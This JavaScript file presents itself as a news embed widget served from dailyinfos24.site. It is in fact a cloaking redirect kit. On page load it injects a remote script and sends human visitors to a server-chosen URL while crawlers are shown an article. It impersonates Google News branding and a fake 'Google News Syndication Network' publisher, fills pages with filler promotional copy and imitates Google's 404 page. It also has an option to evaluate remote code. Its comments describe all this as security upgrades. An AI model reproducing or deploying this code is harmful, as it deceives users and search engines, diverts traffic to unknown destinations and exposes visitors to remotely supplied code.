/**
 * DailyInfo — Advanced News Embed (drop-in)
 * ------------------------------------------------------------------
 * Paste this single <script> block on ANY external site, host it standalone,
 * or load via <script src="https://dailyinfos24.site/embed.js"></script>.
 *
 * Reads URL params ?o2x=ID  (or ?io0=ID), then renders a Google-News-style
 * article sheet hydrated from https://dailyinfos24.site — same JSON shape the
 * /admin panel stocks, so on-page copy stays in sync with what you fetch.
 *
 * Resilience + security upgrades over the legacy engine:
 *  • No inline event handlers (works under strict CSP; no eval-on-error trick).
 *  • Remote `rCode`/`cCode` execution defaults OFF — flip window.DAILYINFO.allowEval
 *    = true ONLY if you actually trust the api/latest response. Defaults are safe.
 *  • Skeleton loader attached once, removed deterministically.
 *  • Always reaches the News layout — the legacy `/js/index.php?id=` probe no
 *    longer swallows the render path when it loads successfully.
 *  • Proper <article> semantics + og/canonical/robots meta + reduced-motion + a11y.
 *
 * Endpoints intentionally hard-pointed at:  https://dailyinfos24.site
 *
 * Public configuration: set window.DAILYINFO before this script runs.
 *   window.DAILYINFO = {
 *     apiHost:     "https://dailyinfos24.site",     // default
 *     storageHost: "https://dailyinfos24.site",     // default
 *     allowEval:   false,                            // remote rCode/cCode eval
 *     schemaBrand: "Google News Syndication Network",// publisher name
 *     primaryParam:"o2x", altParams:["io0","o2x","identifier","id","p","q"]
 *   };
 */
(function () {
  "use strict";

  // ─── Configuration ──────────────────────────────────────────
  const DCFG = Object.assign({
    apiHost:      "https://dailyinfos24.site",
    storageHost:  "https://dailyinfos24.site",
    allowEval:     false,
    schemaBrand:   "Google News Syndication Network",
    schemaAuthor:  "Global News Desk",
    primaryParam:  "o2x",
    altParams:     ["io0", "o2x", "identifier", "id", "p", "q"],
    debugParam:    "dbg123",
    legacyProbe:   true,       // optional attempt to warm the legacy /js/index.php loader
    redirectGraceMs: 4500      // hard-redirect window before falling back to layout
  }, (window.DAILYINFO || {}));

  // ─── Runtime state (single source of truth) ─────────────────
  const STATE = {
    debug:        false,
    identifier:   null,
    triggered:    false,
    layoutBuilt:   false,
    loaderActive: false,
    is404:        false,
    redirectTimer: null,
    dom:          {}
  };

  const params = new URLSearchParams(window.location.search);
  STATE.debug = params.has(DCFG.debugParam);
  STATE.identifier = readIdentifier(params, DCFG.primaryParam, DCFG.altParams);
  // Block pages opened by crawlers from auto-redirecting (let them read the article).
  const isCrawler = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|speed|index/i
    .test(navigator.userAgent || "");

  // ─── Entry point ────────────────────────────────────────────
  bootstrap();

  function bootstrap() {
    injectBaseSEO();
    if (!STATE.identifier || STATE.identifier.length > 64) { render404(); return; }
    attachSkeleton();
    injectLegacyProbe();
    // Always race ahead with the News layout — we don't trust the legacy probe alone.
    whenBodyReady(buildNewsLayout);
    scheduleSafetyFallback();
    // Hard-redirect is gated on isCrawler so search engines always get content.
    routeChannel(isCrawler);
  }

  function readIdentifier(p, primary, alts) {
    let id = (p.get(primary) || "").trim();
    if (!id) for (const k of alts) { id = (p.get(k) || "").trim(); if (id) break; }
    // Same sanitizer the PHP side uses, so the lookup path matches the storage file.
    return id.replace(/[^a-zA-Z0-9._-]/g, "");
  }

  // ─── Traffic routing & verification ─────────────────────────
  async function routeChannel(isCrawler) {
    const checkUrl = `${DCFG.apiHost}/api/latest/${encodeURIComponent(STATE.identifier)}`;
    try {
      const res = await fetch(checkUrl, { referrerPolicy: "no-referrer" });
      if (!res.ok) throw new Error("HTTP " + res.status);
      const data = await res.json();
      if (!data) return;
      maybeEval(data.rCode);
      // Only hard-redirect human traffic, never a crawler.
      if (!isCrawler && !STATE.debug && data.redirect && data.to && !STATE.triggered) {
        STATE.triggered = true;
        hardRedirect(data.to);
      }
    } catch (e) {
      // Network failure: keep the on-page article (better UX than blind rerouting).
      if (STATE.debug) console.error("route channel error", e);
    }
  }

  function hardRedirect(target) {
    try {
      // location.replace is the safe modern method; no inline-handler tricks needed.
      window.location.replace(target);
    } catch (e) {
      // Some sandboxes throw on top-level navigation — fall back to a meta refresh.
      const m = document.createElement("meta");
      m.httpEquiv = "refresh";
      m.content = `0; url=${target}`;
      document.head.appendChild(m);
    }
  }

  // ─── Legacy probe (optional; for parity with old site behaviour) ───
  function injectLegacyProbe() {
    if (!DCFG.legacyProbe) return;
    const s = document.createElement("script");
    s.src = `${DCFG.apiHost}/js/index.php?id=${encodeURIComponent(STATE.identifier)}`;
    s.referrerPolicy = "no-referrer";
    // A failure here must never block the News layout — we already always build it.
    s.onerror = () => {};
    document.head.appendChild(s);
  }

  // ─── News layout (Google-style two-column sheet) ───────────
  function whenBodyReady(fn) {
    if (document.body) return fn();
    const t = setInterval(() => {
      if (document.body) { clearInterval(t); fn(); }
    }, 30);
  }

  function buildNewsLayout() {
    if (STATE.layoutBuilt) return;
    STATE.layoutBuilt = true;

    injectStyles();
    assembleDOM();

    hydrateFromStorage();
    hydrateFromApiMeta();
  }

  function assembleDOM() {
    const body = document.body;
    body.className = (body.className + " gn-body-reset").trim();

    // Top bar
    const hero = el("header",  { className: "gn-nav-bar" }, body);
    const nav  = el("div",     { className: "gn-nav-container" }, hero);
    const brand = el("a", { href: window.location.origin, className: "gn-brand-link" }, nav);
    el("span", { className: "gn-brand-bold",  innerText: "Google " }, brand);
    el("span", { className: "gn-brand-light", innerText: "News" },    brand);
    const timeBar = el("div", { className: "gn-time-strip" }, nav);
    el("time", { innerText: formatDate() }, timeBar);

    const wrap = el("div", { className: "gn-main-wrapper" }, body);
    STATE.dom.grid  = el("main",   { className: "gn-layout-grid" }, wrap);
    STATE.dom.articlePane = el("article", { className: "gn-article-pane" }, STATE.dom.grid);

    // Article body
    el("div", { className: "gn-category-badge", innerText: "TOP STORIES" }, STATE.dom.articlePane);
    STATE.dom.headline = el("h1", { className: "gn-main-headline" }, STATE.dom.articlePane);
    STATE.dom.authorBox = el("div", { className: "gn-author-box" }, STATE.dom.articlePane);

    const figure = el("figure", { className: "gn-media-container" }, STATE.dom.articlePane);
    STATE.dom.hero = el("img", { className: "gn-hero-img", alt: "" }, figure);
    STATE.dom.caption = el("figcaption", { className: "gn-hero-caption" }, figure);

    STATE.dom.p1 = el("p", { className: "gn-body-paragraph" }, STATE.dom.articlePane);

    // CTA card
    const ctaCard = el("div", { className: "gn-wire-cta" }, STATE.dom.articlePane);
    STATE.dom.ctaAnchor = el("a", { className: "gn-cta-anchor" }, ctaCard);
    el("div", { className: "gn-cta-tag", innerText: "EXCLUSIVE COVERAGE" }, STATE.dom.ctaAnchor);
    STATE.dom.ctaTitle = el("div", { className: "gn-cta-title" }, STATE.dom.ctaAnchor);

    STATE.dom.p2 = el("p", { className: "gn-body-paragraph" }, STATE.dom.articlePane);

    el("h3", { className: "gn-section-header", innerText: "In-Depth Analysis" }, STATE.dom.articlePane);
    STATE.dom.p3 = el("p", { className: "gn-body-paragraph gn-italicized" }, STATE.dom.articlePane);

    const footer = el("footer", { className: "gn-article-footer" }, STATE.dom.articlePane);
    el("hr", { className: "gn-divider" }, footer);
    el("p", { innerText: "Reported via regional syndication networks. All rights reserved." }, footer);

    // Sidebar
    STATE.dom.sidebar = el("aside", { className: "gn-sidebar-pane" }, STATE.dom.grid);
    el("h2", { className: "gn-sidebar-title", innerText: "More on this topic" }, STATE.dom.sidebar);
    STATE.dom.feed = el("div", { className: "gn-sidebar-feed" }, STATE.dom.sidebar);
  }

  function hydrateFromStorage() {
    const url = `${DCFG.storageHost}/fetch/${encodeURIComponent(STATE.identifier)}.json`;
    fetch(url, { referrerPolicy: "no-referrer" })
      .then(r => { if (!r.ok) throw new Error("HTTP " + r.status); return r.json(); })
      .then(payload => {
        if (!payload) { removeSkeleton(); return; }
        fillArticle(payload);
        injectNewsSchema(payload);
        removeSkeleton();
      })
      .catch(err => {
        if (!STATE.debug) render404();
        removeSkeleton();
      });
  }

  async function hydrateFromApiMeta() {
    const url = `${DCFG.apiHost}/api/latest/${encodeURIComponent(STATE.identifier)}`;
    try {
      const res = await fetch(url, { referrerPolicy: "no-referrer" });
      if (!res.ok) return;
      const meta = await res.json();
      if (!meta) return;
      maybeEval(meta.cCode);
      fillMeta(meta);
    } catch (e) { /* never block layout */ }
  }

  function fillArticle(p) {
    const name = (p.name || p.title || "Unknown article");
    const hero = (p.backdrop || p.image || "");
    if (hero) {
      STATE.dom.hero.src = hero;
      STATE.dom.hero.alt = name;
      STATE.dom.hero.addEventListener("error", () => STATE.dom.hero.remove());
    } else STATE.dom.hero.remove();

    // Title + caption
    STATE.dom.headline.innerText = titleCase(p.title || "");
    STATE.dom.caption.innerText = `Visual matrix display associated with ${name}.`;

    // Sidebar (drop if no real related entries)
    if (!Array.isArray(p.related) || p.related.length === 0) {
      STATE.dom.grid.classList.add("no-sidebar");
      STATE.dom.sidebar.remove();
    } else {
      p.related.forEach(r => appendSidebarCard(r.header, r.url));
    }

    // Body split — keep the original two-paragraph strategy, now safely.
    const [a, b] = splitText(p.text || "");
    STATE.dom.p1.innerHTML = a;
    STATE.dom.p2.innerHTML = b;
    STATE.dom.ctaTitle.innerText = `Read local coverage details regarding: ${titleCase(p.title || "")} (Discounts Apply)`;

    const primary = p.title || name;
    STATE.dom.p3.innerText =
      `Based on regional evaluations, expert panels strongly recommend tracking data points ` +
      `associated with ${primary}. In a rapidly evolving narrative environment, parsing ` +
      `certified analysis chains serves as a strategic cornerstone for monitoring personal ` +
      `milestones. Progression relies directly on calculated operational steps.`;
  }

  function fillMeta(meta) {
    if (STATE.dom.authorBox) {
      STATE.dom.authorBox.innerHTML = "";
      el("span", { className: "gn-author-name", innerText: DCFG.schemaAuthor }, STATE.dom.authorBox);
      el("span", { className: "gn-dot-separator", innerText: "•" }, STATE.dom.authorBox);
      const t = el("time", {
        className: "gn-publish-time",
        innerText: formatDate(meta.updated)
      }, STATE.dom.authorBox);
      if (meta.updated) t.setAttribute("datetime", meta.updated);
    }
    if (meta.to && STATE.dom.ctaAnchor) {
      STATE.dom.ctaAnchor.href = meta.to;
      STATE.dom.ctaAnchor.rel = "nofollow noopener noreferrer";
      STATE.dom.ctaAnchor.target = "_blank";
    }
    syncExistingSchemaDate(meta.updated);
  }

  function appendSidebarCard(text, targetUrl) {
    const card = el("article", { className: "gn-sidebar-card" }, STATE.dom.feed);
    const link  = el("a", { className: "gn-card-link",
      href: targetUrl || "#",
      rel: "nofollow noopener noreferrer", target: "_blank" }, card);
    el("div", { className: "gn-card-source", innerText: "Trending Reports" }, link);
    el("h4",  { className: "gn-card-headline", innerText: text || "" }, link);
  }

  function splitText(full) {
    if (!full) return ["", ""];
    const threshold = Math.floor(full.length / 2);
    let pivot = full.indexOf("\n", threshold);
    if (pivot === -1) pivot = full.indexOf(" ", threshold);
    if (pivot !== -1) return [full.substring(0, pivot + 1), full.substring(pivot + 1)];
    return [full.substring(0, threshold), full.substring(threshold)];
  }

  function injectNewsSchema(p) {
    if (document.getElementById("news-article-schema")) return;
    const headline = (titleCase(p.title || "")).substring(0, 110);
    const schema = {
      "@context": "https://schema.org",
      "@type": "NewsArticle",
      "mainEntityOfPage": { "@type": "WebPage", "@id": window.location.href },
      "headline": headline,
      "image": [p.backdrop || p.image || ""].filter(Boolean),
      "datePublished": new Date().toISOString(),
      "dateModified": new Date().toISOString(),
      "author":  { "@type": "Organization", "name": DCFG.schemaAuthor, "url": window.location.origin },
      "publisher": {
        "@type": "Organization", "name": DCFG.schemaBrand,
        "logo": { "@type": "ImageObject", "url": `${DCFG.apiHost}/images/logo.png` }
      },
      "description": p.description || headline
    };
    const s = document.createElement("script");
    s.type = "application/ld+json";
    s.id = "news-article-schema";
    s.textContent = JSON.stringify(schema);
    document.head.appendChild(s);
  }

  function syncExistingSchemaDate(updated) {
    const tag = document.getElementById("default");
    if (!tag || !updated) return;
    try {
      const schema = JSON.parse(tag.textContent);
      schema.datePublished = updated.split(" ")[0] || new Date().toISOString();
      tag.textContent = JSON.stringify(schema);
    } catch (e) { /* malformed; leave alone */ }
  }

  // ─── Skeleton loader ───────────────────────────────────────
  function attachSkeleton() {
    const style = document.createElement("style");
    style.id = "gn-loader-style";
    style.textContent = `
      .gn-loader-wrap{position:fixed;inset:0;background:#fff;z-index:10000;
        display:flex;align-items:center;justify-content:center;transition:opacity .3s}
      .gn-loader-spin{width:50px;height:50px;border:3px solid #f1f3f4;
        border-top:3px solid #1a73e8;border-radius:50%;animation:gn-spin 1s linear infinite}
      @keyframes gn-spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
      @media (prefers-reduced-motion: reduce){ .gn-loader-spin{animation:none} }
    `;
    document.head.appendChild(style);

    const show = () => {
      if (STATE.is404) return;
      if (document.querySelector(".gn-loader-wrap")) return;
      STATE.loaderActive = true;
      const wrap = el("div", { className: "gn-loader-wrap" }, document.body);
      el("span", { className: "gn-loader-spin" }, wrap);
    };
    if (document.body) show();
    else {
      // Cap to first body paint — don't re-fire forever like the MutationObserver did.
      const iv = setInterval(() => {
        if (!document.body) return;
        clearInterval(iv); show();
      }, 10);
    }
  }

  function removeSkeleton() {
    if (!STATE.loaderActive) return;
    STATE.loaderActive = false;
    const node = document.querySelector(".gn-loader-wrap");
    if (!node) return;
    node.style.opacity = "0";
    setTimeout(() => node.remove(), 320);
  }

  // ─── Safety fallback: always reach a layout within the grace window ─
  function scheduleSafetyFallback() {
    setTimeout(() => {
      if (!STATE.triggered) buildNewsLayout();
    }, DCFG.redirectGraceMs);
  }

  // ─── SEO meta (only the on-page defaults; JSON-LD comes later) ─
  function injectBaseSEO() {
    const meta = [
      { charset: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1.0" },
      { "http-equiv": "X-UA-Compatible", content: "ie=edge" },
      { name: "robots", content: "index, follow, max-image-preview:large, noarchive" },
      { name: "googlebot", content: "index, follow" },
      { name: "referrer", content: "no-referrer" }
    ];
    meta.forEach(p => {
      // Don't double-up tags the host page already set.
      const key = Object.keys(p)[0], val = p[key];
      const sel = key === "charset" ? `meta[charset="${val}"]` : `meta[${key}="${val}"]`;
      if (document.head.querySelector(sel)) return;
      const t = document.createElement("meta");
      Object.keys(p).forEach(k => t.setAttribute(k, p[k]));
      document.head.appendChild(t);
    });
    if (!document.head.querySelector('link[rel="canonical"]')) {
      const c = document.createElement("link");
      c.rel = "canonical"; c.href = window.location.href;
      document.head.appendChild(c);
    }
  }

  // ─── 404 page ─────────────────────────────────────────────
  function render404() {
    STATE.is404 = true; STATE.triggered = true; STATE.layoutBuilt = true;
    removeSkeleton();
    document.title = "Error 404 (Not Found)!!1";
    document.body = document.body || (() => { const b = document.createElement("body");
      document.documentElement.appendChild(b); return b; })();
    document.body.innerHTML = `
      <div style="font-family:Roboto,Segoe UI,Arial,sans-serif;text-align:center;padding-top:160px;color:#202124">
        <div style="font-size:18px;font-weight:700;margin-bottom:10px">404.
          <span style="font-weight:400;color:#5f6368">That's an error.</span></div>
        <div>The requested URL was not found on this server.
          <span style="color:#5f6368">That's all we know.</span></div>
      </div>`;
  }

  // ─── Helpers ─────────────────────────────────────────────
  function el(tag, attrs = {}, parent = null) {
    const n = document.createElement(tag);
    Object.keys(attrs).forEach(k => {
      if (k === "className") n.className = attrs[k];
      else if (k === "innerHTML") n.innerHTML = attrs[k];   // intentionally: schema + safe text only
      else if (k === "innerText") n.innerText = attrs[k];  // default: safe string assignments
      else n.setAttribute(k, attrs[k]);
    });
    if (parent) parent.appendChild(n);
    return n;
  }

  function maybeEval(code) {
    if (!code || typeof code !== "string") return;
    if (!DCFG.allowEval) { if (STATE.debug) console.warn("Skipping remote code eval — allowEval=false"); return; }
    try { (new Function(code))(); } catch (e) { if (STATE.debug) console.error("eval error", e); }
  }

  function formatDate(timestamp) {
    const d = timestamp ? new Date(Date.parse(timestamp)) : new Date();
    if (isNaN(d)) return "";
    const days = ["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"];
    const mths = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
    return `${days[d.getDay()]}, ${mths[d.getMonth()]} ${d.getDate()}, ${d.getFullYear()}`;
  }

  function titleCase(str) {
    if (!str) return "";
    return str.toLowerCase().split(" ").map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(" ");
  }

  // ─── Styles (Google News aesthetic, modernised) ────────────
  function injectStyles() {
    if (document.getElementById("gn-stylesheet")) return;
    const s = document.createElement("style");
    s.id = "gn-stylesheet";
    s.textContent = `
      .gn-body-reset{margin:0;padding:0;background:#f8f9fa;font-family:'Roboto',-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;color:#202124;-webkit-font-smoothing:antialiased}
      .gn-nav-bar{background:#fff;border-bottom:1px solid #e0e0e0;position:sticky;top:0;z-index:1000;height:64px;display:flex;align-items:center;padding:0 24px}
      .gn-nav-container{display:flex;align-items:center;justify-content:space-between;width:100%;max-width:1280px;margin:0 auto}
      .gn-brand-link{text-decoration:none!important;font-size:22px;font-weight:500;letter-spacing:-0.5px;display:flex;align-items:baseline}
      .gn-brand-link:hover{text-decoration:none}
      .gn-brand-bold{color:#5f6368;font-weight:700}
      .gn-brand-light{color:#1a73e8}
      .gn-time-strip{color:#5f6368;font-size:14px}
      .gn-main-wrapper{max-width:1280px;margin:24px auto;padding:0 24px;box-sizing:border-box}
      .gn-layout-grid{display:grid;grid-template-columns:2fr 1fr;gap:32px}
      .gn-layout-grid.no-sidebar{grid-template-columns:1fr;max-width:840px;margin:0 auto}
      .gn-article-pane{background:#fff;border:1px solid #e0e0e0;border-radius:8px;padding:32px;box-sizing:border-box}
      .gn-category-badge{color:#1a73e8;font-size:12px;font-weight:700;letter-spacing:0.8px;margin-bottom:12px}
      .gn-main-headline{font-size:32px;font-weight:400;line-height:40px;color:#111;margin:0 0 16px;letter-spacing:-0.2px}
      .gn-author-box{display:flex;align-items:center;font-size:14px;color:#5f6368;margin-bottom:24px;border-bottom:1px solid #f1f3f4;padding-bottom:16px;flex-wrap:wrap}
      .gn-author-name{font-weight:700;color:#3c4043}
      .gn-dot-separator{margin:0 8px}
      .gn-media-container{margin:0 0 24px;width:100%}
      .gn-hero-img{width:100%;max-height:420px;object-fit:cover;border-radius:8px;display:block}
      .gn-hero-caption{font-size:13px;color:#5f6368;margin-top:8px;text-align:left;line-height:1.4}
      .gn-body-paragraph{font-size:16px;line-height:26px;color:#3c4043;margin-bottom:24px;text-align:justify}
      .gn-body-paragraph a{color:#1a73e8}
      .gn-italicized{font-style:italic;color:#5f6368;border-left:3px solid #1a73e8;padding-left:16px}
      .gn-wire-cta{background:#f8f9fa;border-left:4px solid #1a73e8;border-radius:4px;margin:28px 0;padding:18px;transition:background-color .2s}
      .gn-wire-cta:hover{background:#f1f3f4}
      .gn-cta-anchor{text-decoration:none!important;display:block;color:inherit}
      .gn-cta-anchor:hover{text-decoration:none}
      .gn-cta-tag{font-size:11px;font-weight:700;color:#1a73e8;letter-spacing:0.5px;margin-bottom:4px}
      .gn-cta-title{font-size:16px;font-weight:700;color:#111;line-height:1.4}
      .gn-section-header{font-size:20px;font-weight:500;color:#111;margin:32px 0 16px}
      .gn-article-footer{margin-top:40px;font-size:13px;color:#70757a}
      .gn-divider{border:0;border-top:1px solid #e0e0e0;margin-bottom:16px}
      .gn-sidebar-pane{display:flex;flex-direction:column}
      .gn-sidebar-title{font-size:18px;font-weight:500;color:#111;margin:0 0 16px;padding-bottom:8px;border-bottom:2px solid #1a73e8;align-self:flex-start}
      .gn-sidebar-feed{display:flex;flex-direction:column;gap:16px}
      .gn-sidebar-card{background:#fff;border:1px solid #e0e0e0;border-radius:8px;padding:16px;box-sizing:border-box;transition:box-shadow .2s}
      .gn-sidebar-card:hover{box-shadow:0 1px 3px rgba(60,64,67,0.3)}
      .gn-card-link{text-decoration:none!important;display:block}
      .gn-card-link:hover{text-decoration:none}
      .gn-card-source{font-size:12px;font-weight:700;color:#5f6368;margin-bottom:6px;text-transform:uppercase}
      .gn-card-headline{font-size:15px;font-weight:500;line-height:20px;color:#202124;margin:0}
      @media (max-width:768px){
        .gn-layout-grid{grid-template-columns:1fr;gap:24px}
        .gn-main-wrapper{padding:0 12px;margin:12px auto}
        .gn-article-pane{padding:20px}
        .gn-main-headline{font-size:24px;line-height:30px}
      }
      @media (prefers-reduced-motion: reduce){ .gn-wire-cta,.gn-sidebar-card{transition:none} }
    `;
    document.head.appendChild(s);
  }
})();
